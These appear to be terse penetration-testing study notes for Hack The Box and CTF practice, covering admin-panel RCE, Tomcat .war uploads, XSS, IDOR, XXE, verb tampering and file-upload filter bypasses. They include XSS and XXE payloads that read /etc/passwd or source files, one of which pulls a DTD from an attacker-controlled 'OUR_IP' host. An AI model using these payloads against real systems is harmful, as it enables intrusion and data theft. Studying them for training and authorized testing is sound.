### RCE with admin creds
login find theme option that is not primary. insert php shell -> update file -> find file execute

### RCE with admin creds

Templates-> pick a template -> add rce -> save exit -> go to page/execute

# Services
## Tomcat
common attack is uploading a .war to get a shell. This can be done with default tomcat creds or finding admin creds.


# Common Web Exploits

## XSS

XSS (Cross-Site Scripting) is an exploit that relies on the execution of unsanitized JavaScript code on a website. This code execution allows the attacker to capture information from other users who interact with the page, including their cookies.

In the context of HTB (Hack The Box) and CTFs (Capture The Flag competitions), if you know that an admin bot is going to interact with a page, XSS may be a viable option for exploitation.

There are three variants of XSS:

    Stored/Persistent: In this variant, the malicious code is stored in the backend database and will affect any user who visits the site where the code is displayed.

    Reflected: Reflected XSS is similar to stored XSS, but the malicious code is not stored persistently. Instead, it is embedded in a URL or input field and is only triggered when the user interacts with it.

    DOM-based: DOM-based XSS exploits vulnerabilities in the Document Object Model (DOM) of a web page. The attack occurs when the client-side JavaScript code manipulates the DOM incorrectly, allowing an attacker to inject and execute malicious code.


Below is an example of code that could be used to test
```
<script>alert(window.origin)</script>
```
a pop up (below) would confirm the presence of XSS

## Insecure Direct Object References(IDOR)

Identifying IDORs: Look for URL parameters or APIs with object references (e.g., ?uid=1 or ?filename=file_1.pdf). These references are often found in URL parameters, APIs, or other HTTP headers like cookies.

## XML External Entity (XXE) Injection
The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. 

### Local File Disclosure example

```
<!DOCTYPE email [
  <!ENTITY new_ent SYSTEM "file:///etc/passwd">
]>
```
Define a new external entity

### PHP wrappers
some files may contain characters that will break the request. Can use a PHP wrapper to base64 encode

```
<!DOCTYPE email [
  <!ENTITY new_ent SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

### Error Based XXE

Create xxe.dtd file and host it
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

### RCE with XXE
If PHP expect module is enabled(not likley)

## HTTP Verb Tampering
A web server's authentication configuration may be limited to specific HTTP methods, which would leave some HTTP methods accessible without authentication. Exploiting HTTP Verb Tampering vulnerabilities is usually a relatively straightforward process. We just need to try alternate HTTP methods to see how they are handled by the web server and the web application. 

To show what options are available
```
curl -i -X OPTIONS http://SERVER_IP:PORT/
```
Can change request methods easily in burp by right clicking

## File Upload attacks

Want to upload a file to a server to get a reverse shell. Typically there are 4 kinds of bolcks, client side validation, Whitelist, BlackList, Type filters.

Have to be able to find and access the file after the upload.

### Example
Try to upload shell and fail

Send a real image that will get accepted. Intercept the request. remove the image and input the shell. GIF added to evade type filter. File name extentions to bypass black and white list.

Visit page to get shell

Can use Burp intruder to fuzz for accpeted extentions
